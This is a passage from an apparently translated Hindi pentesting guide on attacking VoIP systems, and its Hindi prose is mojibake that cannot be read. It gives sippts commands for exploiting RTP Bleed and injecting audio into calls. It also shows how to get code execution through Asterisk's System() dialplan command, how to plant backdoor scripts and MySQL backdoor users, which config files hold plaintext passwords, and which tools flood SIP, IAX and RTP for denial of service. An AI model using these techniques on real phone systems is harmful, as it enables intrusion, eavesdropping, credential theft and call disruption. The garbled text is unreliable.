рджреБрд░реНрдмрд▓рддрд╛ рджреЛрдиреЛрдВ RTP рдкреНрд░реЙрдХреНрд╕реА рдФрд░ рдПрдВрдбрдкреЙрдЗрдВрдЯреНрд╕ рдореЗрдВ рдкрд╛рдИ рдЬрд╛ рд╕рдХрддреА рд╣реИред

Asterisk рдФрд░ FreePBX рдиреЗ рдкрд╛рд░рдВрдкрд░рд┐рдХ рд░реВрдк рд╕реЗ **`NAT=yes` рд╕реЗрдЯрд┐рдВрдЧ** рдХрд╛ рдЙрдкрдпреЛрдЧ рдХрд┐рдпрд╛ рд╣реИ, рдЬреЛ RTP рдЯреНрд░реИрдлрд┐рдХ рдХреЛ рдкреНрд░рдорд╛рдгреАрдХрд░рдг рдХреЛ рдЫреЛрдбрд╝ рджреЗрддрд╛ рд╣реИ, рдЬрд┐рд╕рд╕реЗ рдХреЙрд▓реЛрдВ рдкрд░ рдХреЛрдИ рдСрдбрд┐рдпреЛ рдпрд╛ рдПрдХрддрд░рдлрд╝рд╛ рдСрдбрд┐рдпреЛ рд╣реЛ рд╕рдХрддрд╛ рд╣реИред

рдЕрдзрд┐рдХ рдЬрд╛рдирдХрд╛рд░реА рдХреЗ рд▓рд┐рдП [https://www.rtpbleed.com/](https://www.rtpbleed.com/) рджреЗрдЦреЗрдВ

* [**sippts**](https://github.com/Pepelux/sippts) рд╕реЗ **`rtpbleed.py`**:** рдпрд╣ RTP Bleed рд╕реБрд░рдХреНрд╖рд╛ рджреБрд░реНрдмрд▓рддрд╛ рдХрд╛ рдкрддрд╛ рд▓рдЧрд╛рддрд╛ рд╣реИ рдФрд░ RTP рд╕реНрдЯреНрд░реАрдо рднреЗрдЬрддрд╛ рд╣реИред
```bash
python3 rtpbleed.py -i 10.10.0.10
```
* **`rtcpbleed.py`** рдпрд╣ [**sippts**](https://github.com/Pepelux/sippts) рд╕реЗ рд╣реИред рдпрд╣ RTP Bleed рд╕реБрд░рдХреНрд╖рд╛ рдХрдордЬреЛрд░реА рдХреЛ рдкрд╣рдЪрд╛рдирддрд╛ рд╣реИ рдФрд░ RTP рд╕реНрдЯреНрд░реАрдо рднреЗрдЬрддрд╛ рд╣реИред
```bash
python3 rtcpbleed.py -i 10.10.0.10
```
* **`rtpbleedflood.py`** рдпрд╣ [**sippts**](https://github.com/Pepelux/sippts) рд╕реЗ рд╣реИрдВред: RTP Bleed рд╕реБрд░рдХреНрд╖рд╛ рдХрдордЬреЛрд░реА рдХрд╛ рдЙрдкрдпреЛрдЧ рдХрд░рдХреЗ RTP рд╕реНрдЯреНрд░реАрдо рднреЗрдЬреЗрдВред
```bash
python3 rtpbleedflood.py -i 10.10.0.10 -p 10070 -v
```
* **`rtpbleedinject.py`** рдпрд╣ [**sippts**](https://github.com/Pepelux/sippts) рд╕реЗ рд╣реИрдВ:** RTP Bleed рджреБрд░реБрдкрдпреЛрдЧ рдХрд░рдХреЗ RTP рд╕реНрдЯреНрд░реАрдо (рдСрдбрд┐рдпреЛ рдлрд╝рд╛рдЗрд▓ рд╕реЗ) рднреЗрдЬреЗрдВред
```bash
python3 rtpbleedinject.py -i 10.10.0.10 -p 10070 -f audio.wav
```
### RCE

рдПрд╕реНрдЯреЗрд░рд┐рд╕реНрдХ рдореЗрдВ рдЖрдк рдХрд┐рд╕реА рддрд░реАрдХреЗ рд╕реЗ **рдПрдХреНрд╕рдЯреЗрдВрд╢рди рдирд┐рдпрдо рдЬреЛрдбрд╝рдиреЗ рдФрд░ рдЙрдиреНрд╣реЗрдВ рд░реАрд▓реЛрдб рдХрд░рдиреЗ** рдХреА рдХреНрд╖рдорддрд╛ рдкреНрд░рд╛рдкреНрдд рдХрд░рддреЗ рд╣реИрдВ (рдЙрджрд╛рд╣рд░рдг рдХреЗ рд▓рд┐рдП, рдХрд┐рд╕реА рднреА рд╕рдВрдХрдЯрдЧреНрд░рд╕реНрдд рд╡реЗрдм рдкреНрд░рдмрдВрдзрдХ рд╕рд░реНрд╡рд░ рдХреЛ рд╕рдВрдХреНрд░рдорд┐рдд рдХрд░рдХреЗ), **`System`** рдХрдорд╛рдВрдб рдХрд╛ рдЙрдкрдпреЛрдЧ рдХрд░рдХреЗ RCE рдкреНрд░рд╛рдкреНрдд рдХрд┐рдпрд╛ рдЬрд╛ рд╕рдХрддрд╛ рд╣реИред
```scss
same => n,System(echo "Called at $(date)" >> /tmp/call_log.txt)
```
рдПрдХ рдРрд╕рд╛ рдЖрджреЗрд╢ рд╣реИ рдЬрд┐рд╕реЗ **`рд╢реИрд▓`** рдХрд╣рд╛ рдЬрд╛ рд╕рдХрддрд╛ рд╣реИ рдФрд░ рдЗрд╕реЗ рдЙрдкрдпреЛрдЧ рдХрд┐рдпрд╛ рдЬрд╛ рд╕рдХрддрд╛ рд╣реИ **`рд╕рд┐рд╕реНрдЯрдо`** рдХреА рдмрдЬрд╛рдп рд╕рд┐рд╕реНрдЯрдо рдХрдорд╛рдВрдбреЛрдВ рдХреЛ рдирд┐рд╖реНрдкрд╛рджрд┐рдд рдХрд░рдиреЗ рдХреЗ рд▓рд┐рдП рдпрджрд┐ рдЖрд╡рд╢реНрдпрдХ рд╣реЛред

{% hint style="warning" %}
рдпрджрд┐ рд╕рд░реНрд╡рд░ **`рд╕рд┐рд╕реНрдЯрдо`** рдХрдорд╛рдВрдб рдореЗрдВ рдХреБрдЫ рд╡рд┐рд╢реЗрд╖ рд╡рд░реНрдгреЛрдВ рдХрд╛ рдЙрдкрдпреЛрдЧ рдЕрдиреБрдорддрд┐ рдирд╣реАрдВ рджреЗ рд░рд╣рд╛ рд╣реИ (рдЬреИрд╕реЗ Elastix рдореЗрдВ), рддреЛ рдпрд╣ рдЬрд╛рдВрдЪреЗрдВ рдХрд┐ рдХреНрдпрд╛ рд╡реЗрдм рд╕рд░реНрд╡рд░ рдХрд┐рд╕реА рддрд░рд╣ рд╕реЗ рд╕рд┐рд╕реНрдЯрдо рдХреЗ рдЕрдВрджрд░ рдлрд╝рд╛рдЗрд▓реЗрдВ рдмрдирд╛рдиреЗ рдХреА рдЕрдиреБрдорддрд┐ рджреЗрддрд╛ рд╣реИ (рдЬреИрд╕реЗ Elastix рдпрд╛ trixbox рдореЗрдВ) рдФрд░ рдЗрд╕реЗ рдЙрдкрдпреЛрдЧ рдХрд░рдХреЗ рдПрдХ рдмреИрдХрдбреЛрд░ рд╕реНрдХреНрд░рд┐рдкреНрдЯ рдмрдирд╛рдПрдВ рдФрд░ рдлрд┐рд░ рдЙрд╕ рд╕реНрдХреНрд░рд┐рдкреНрдЯ рдХреЛ рдирд┐рд╖реНрдкрд╛рджрд┐рдд рдХрд░рдиреЗ рдХреЗ рд▓рд┐рдП **`рд╕рд┐рд╕реНрдЯрдо`** рдХрд╛ рдЙрдкрдпреЛрдЧ рдХрд░реЗрдВред
{% endhint %}

#### рджрд┐рд▓рдЪрд╕реНрдк рд╕реНрдерд╛рдиреАрдп рдлрд╝рд╛рдЗрд▓реЗрдВ рдФрд░ рдЕрдиреБрдорддрд┐рдпрд╛рдБ

* **`sip.conf`** -> SIP рдЙрдкрдпреЛрдЧрдХрд░реНрддрд╛рдУрдВ рдХрд╛ рдкрд╛рд╕рд╡рд░реНрдб рд╕рдВрдЧреНрд░рд╣реАрдд рдХрд░рддрд╛ рд╣реИред
* рдпрджрд┐ **Asterisk рд╕рд░реНрд╡рд░ рд░реВрдЯ рдХреЗ рд░реВрдк рдореЗрдВ рдЪрд▓ рд░рд╣рд╛ рд╣реИ**, рддреЛ рдЖрдк рд░реВрдЯ рдХреЛ рдХрдВрдкреНрд░реЛрдорд╛рдЗрдЬ рдХрд░ рд╕рдХрддреЗ рд╣реИрдВ
* **mysql рд░реВрдЯ рдЙрдкрдпреЛрдЧрдХрд░реНрддрд╛** рдХреЗ рдкрд╛рд╕рд╡рд░реНрдб рдирд╣реАрдВ рд╣реЛ рд╕рдХрддрд╛ рд╣реИред
* рдЗрд╕рдХрд╛ рдЙрдкрдпреЛрдЧ рдПрдХ рдирдпрд╛ mysql рдЙрдкрдпреЛрдЧрдХрд░реНрддрд╛ рдмреИрдХрдбреЛрд░ рдХреЗ рд░реВрдк рдореЗрдВ рдмрдирд╛рдиреЗ рдХреЗ рд▓рд┐рдП рдХрд┐рдпрд╛ рдЬрд╛ рд╕рдХрддрд╛ рд╣реИ
* **`FreePBX`**
* **`amportal.conf`** -> рд╡реЗрдм рдкреИрдирд▓ рдкреНрд░рд╢рд╛рд╕рдХ (FreePBX) рдХрд╛ рдкрд╛рд╕рд╡рд░реНрдб рд╕рдВрдЧреНрд░рд╣реАрдд рдХрд░рддрд╛ рд╣реИ
* **`FreePBX.conf`** -> рдбреЗрдЯрд╛рдмреЗрд╕ рддрдХ рдкрд╣реБрдВрдЪ рдХрд░рдиреЗ рдХреЗ рд▓рд┐рдП рдЙрдкрдпреЛрдЧ рдХрд┐рдП рдЬрд╛рдиреЗ рд╡рд╛рд▓реЗ рдЙрдкрдпреЛрдЧрдХрд░реНрддрд╛ FreePBXuser рдХрд╛ рдкрд╛рд╕рд╡рд░реНрдб рд╕рдВрдЧреНрд░рд╣реАрдд рдХрд░рддрд╛ рд╣реИ
* рдЗрд╕рдХрд╛ рдЙрдкрдпреЛрдЧ рдПрдХ рдирдпрд╛ mysql рдЙрдкрдпреЛрдЧрдХрд░реНрддрд╛ рдмреИрдХрдбреЛрд░ рдХреЗ рд░реВрдк рдореЗрдВ рдмрдирд╛рдиреЗ рдХреЗ рд▓рд┐рдП рдХрд┐рдпрд╛ рдЬрд╛ рд╕рдХрддрд╛ рд╣реИ
* **`Elastix`**
* **`Elastix.conf`** -> mysql рд░реВрдЯ рдкрд╛рд╕рд╡рд░реНрдб, IMAPd рдкрд╛рд╕рд╡рд░реНрдб, рд╡реЗрдм рд╡реНрдпрд╡рд╕реНрдерд╛рдкрдХ рдкрд╛рд╕рд╡рд░реНрдб рдЬреИрд╕реЗ рдХрдИ рдкрд╛рд╕рд╡рд░реНрдб рд╕рд╛рдл рдкрд╛рда рдореЗрдВ рд╕рдВрдЧреНрд░рд╣реАрдд рдХрд░рддрд╛ рд╣реИ
* рдХрдИ рдлрд╝реЛрд▓реНрдбрд░реНрд╕ (рдпрджрд┐ рд░реВрдЯ рдХреЗ рд░реВрдк рдореЗрдВ рдирд╣реАрдВ рдЪрд▓ рд░рд╣рд╛ рд╣реИ) рдХрдВрдкреНрд░реЛрдорд╛рдЗрдЬрд╝реНрдб рдПрд╕реНрдЯреЗрд░рд┐рд╕реНрдХ рдЙрдкрдпреЛрдЧрдХрд░реНрддрд╛ рдХреЗ рдирд╛рдо рд╣реЛрдВрдЧреЗред рдЗрд╕ рдЙрдкрдпреЛрдЧрдХрд░реНрддрд╛ рдХреЛ рдкрд┐рдЫрд▓реА рдлрд╝рд╛рдЗрд▓реЗрдВ рдкрдврд╝ рд╕рдХрддреА рд╣реИрдВ рдФрд░ рд╕рдорд╛рдХреГрддрд┐ рдХреЛ рдирд┐рдпрдВрддреНрд░рд┐рдд рдХрд░рддреА рд╣реИрдВ, рдЗрд╕рд▓рд┐рдП рдЬрдм рдирд┐рд╖реНрдкрд╛рджрд┐рдд рд╣реЛрддрд╛ рд╣реИ, рд╡рд╣ рдЕрдиреНрдп рдмреИрдХрдбреЛрд░ рдмрд╛рдЗрдирд░реА рдХреЛ рд▓реЛрдб рдХрд░рдиреЗ рдХреЗ рд▓рд┐рдП рдПрд╕реНрдЯреЗрд░рд┐рд╕реНрдХ рдХреЛ рдмрдирд╛ рд╕рдХрддрд╛ рд╣реИред

### RTP рдЗрдВрдЬреЗрдХреНрд╢рди

**`rtpinsertsound`** (`sudo apt install rtpinsertsound`) рдФрд░ **`rtpmixsound`** (`sudo apt install rtpmixsound`) рдЬреИрд╕реЗ рдЙрдкрдХрд░рдгреЛрдВ рдХрд╛ рдЙрдкрдпреЛрдЧ рдХрд░рдХреЗ рдмрд╛рддрдЪреАрдд рдореЗрдВ рдПрдХ **`.wav`** рдбрд╛рд▓рд╛ рдЬрд╛ рд╕рдХрддрд╛ рд╣реИред

рдпрд╛ рдЖрдк [http://blog.pepelux.org/2011/09/13/inyectando-trafico-rtp-en-una-conversacion-voip/](http://blog.pepelux.org/2011/09/13/inyectando-trafico-rtp-en-una-conversacion-voip/) рд╕реЗ рд╕реНрдХреНрд░рд┐рдкреНрдЯ рдХрд╛ рдЙрдкрдпреЛрдЧ рдХрд░рдХреЗ рдмрд╛рддрдЪреАрддреЛрдВ рдХреА **рд╕реНрдХреИрдирд┐рдВрдЧ** (**`rtpscan.pl`**), рдПрдХ `.wav` рдХреЛ рдмрд╛рддрдЪреАрдд рдореЗрдВ рднреЗрдЬрдиреЗ (**`rtpsend.pl`**) рдФрд░ рдмрд╛рддрдЪреАрдд рдореЗрдВ рд╢реЛрд░ рдбрд╛рд▓рдиреЗ (**`rtpflood.pl`**) рдХреЗ рд▓рд┐рдП рдХрд░ рд╕рдХрддреЗ рд╣реИрдВред

### DoS

VoIP рд╕рд░реНрд╡рд░ рдореЗрдВ DoS рдкреНрд░рд╛рдкреНрдд рдХрд░рдиреЗ рдХреЗ рд▓рд┐рдП рдХрдИ рддрд░реАрдХреЗ рд╣реИрдВред

* [**sippts**](https://github.com/Pepelux/sippts) рд╕реЗ **`sipflood.py`**: **_**SipFlood**_ рд▓рдХреНрд╖реНрдп рдХреЛ рдЕрд╕реАрдорд┐рдд рд╕рдВрджреЗрд╢ рднреЗрдЬрддрд╛ рд╣реИ
* `python3 sipflood.py -i 10.10.0.10 -r 5080 -m invite -v`
* [**IAXFlooder**](https://www.kali.org/tools/iaxflood/): Asterisk рджреНрд╡рд╛рд░рд╛ рдЙрдкрдпреЛрдЧ рдХрд┐рдП рдЬрд╛рдиреЗ рд╡рд╛рд▓реЗ IAX рдкреНрд░реЛрдЯреЛрдХреЙрд▓ рдХреЛ DoS рдХрд░реЗрдВ
* [**inviteflood**](https://github.com/foreni-packages/inviteflood/blob/master/inviteflood/Readme.txt): UDP/IP рдкрд░ SIP/SDP INVITE рд╕рдВрджреЗрд╢ рднреЗрдЬрдиреЗ рдХреЗ рд▓рд┐рдП рдПрдХ рдЙрдкрдХрд░рдгред
* [**rtpflood**](https://www.kali.org/tools/rtpflood/): рдХрдИ рдареАрдХ рд░реВрдк рд╕реЗ рдмрдирд╛рдП рдЧрдП RTP рдкреИрдХреЗрдЯ рднреЗрдЬреЗрдВред рдЗрд╕реЗ рдкрд╣рд▓реЗ рд╕реНрдирд┐рдл рдХрд░рдХреЗ рдЙрдкрдпреЛрдЧ рд╣реЛ рд░рд╣реЗ RTP рдкреЛрд░реНрдЯреНрд╕ рдХреЛ рдЬрд╛рдирдирд╛ рдЖрд╡рд╢реНрдпрдХ рд╣реИред
* [**SIPp**](https://github.com/SIPp/sipp): SIP рдЯреНрд░реИрдлрд╝рд┐рдХ рд╡рд┐рд╢реНрд▓реЗрд╖рдг рдФрд░ рдЙрддреНрдкрдиреНрди рдХрд░рдиреЗ рдХреА рдЕрдиреБрдорддрд┐ рджреЗрддрд╛ рд╣реИред рдЗрд╕рд▓рд┐рдП рдЗрд╕реЗ рднреА DoS рдХреЗ рд▓рд┐рдП рдЙрдкрдпреЛрдЧ рдХрд┐рдпрд╛ рдЬрд╛ рд╕
